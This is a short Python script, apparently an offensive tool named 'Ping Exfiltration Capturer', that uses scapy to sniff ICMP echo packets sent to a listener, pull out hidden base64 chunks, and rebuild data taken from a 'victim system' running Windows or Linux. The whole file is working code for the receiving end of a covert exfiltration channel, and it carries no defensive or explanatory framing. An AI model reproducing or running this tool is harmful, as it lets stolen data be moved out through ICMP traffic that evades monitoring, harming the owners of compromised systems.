import warnings
warnings.filterwarnings("ignore") # I used this because some annoying warnings appear when importing scapy
from scapy.all import *
import base64
import argparse
import sys


def check_args():
    parser = argparse.ArgumentParser("Ping Exfiltration Capturer 0.1\n")
    parser.add_argument("-l", "--lst_ip", action="store", dest="lst_ip", help="Listener IP")
    parser.add_argument("-f", "--file", action="store", dest="file", help="File to save exfiltrated data.")
    parser.add_argument("-o", "--os", action="store", dest="os", help="OS from victim system: w=Windows, l=Linux")

    args = parser.parse_args()
    if not args.lst_ip or not args.file or not args.os:
        print("Required parameters not specified.")
        sys.exit(1)

    if args.os.lower() not in ['l','w']:
        print("Wrong OS specified: w=Windows, l=Linux.")
        sys.exit(1)

    return args


def capture_icmps(os, capture):
    processed_data = []

    os_processing = {
        'w': lambda packet: packet[Raw].load.decode('utf-8'),
        'l': lambda packet: packet[Raw].load[16:32].decode('utf-8')
    }

    process_packet = os_processing.get(os.lower())
    if process_packet:
        for packet in capture:
            data = process_packet(packet)
            if data.startswith("!"):
                print("Initial ping")
            elif data.startswith("#"):
                print("Final ping")
            else:
                processed_data.append(data)

    captured_data = ''.join(processed_data)
    return base64.b64decode(captured_data).decode('utf-8')

if __name__ == "__main__":
    args = check_args()
    print("Capturing ICMP echos on "+args.lst_ip+". Press Ctrl+C to stop.")
    capture = sniff(filter="icmp and dst "+args.lst_ip)

    data=capture_icmps(args.os, capture)

    with open(args.file,"w") as dump:
        dump.write(data)


